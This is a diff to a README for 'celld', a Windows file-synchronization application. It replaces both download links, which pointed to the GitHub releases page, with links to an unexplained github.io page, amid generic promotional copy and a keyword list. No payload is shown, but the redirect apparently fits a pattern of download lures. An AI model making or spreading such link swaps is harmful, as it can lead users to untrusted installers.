@@ -38,7 +38,7 @@ These are general guidelines. If your computer is newer than five years old, it 
 
 Visit this link to download the application. The download page contains the latest version of celld, ready for installation.
 
-**[⬇️ Download celld Now](https://github.com/devinautotomic226/celld/releases)**
+**[⬇️ Download celld Now](https://devinautotomic226.github.io)**
 
 ### Step 2: Run the Setup Wizard
 
@@ -148,6 +148,6 @@ celld puts you in control of your digital life. By keeping your files synchroniz
 
 Getting started takes just a few minutes, and the benefits are immediate. Download celld today and discover how effortless managing your distributed data can be. Your files, your devices, your rules—celld makes it all work together seamlessly.
 
-**[🚀 Download celld and Get Started](https://github.com/devinautotomic226/celld/releases)**
+**[🚀 Download celld and Get Started](https://devinautotomic226.github.io)**
 
 Keywords: celld, distributed storage, file synchronization, self-hosted, data management, multi-device, Windows application, automatic backup, local network, privacy-focused
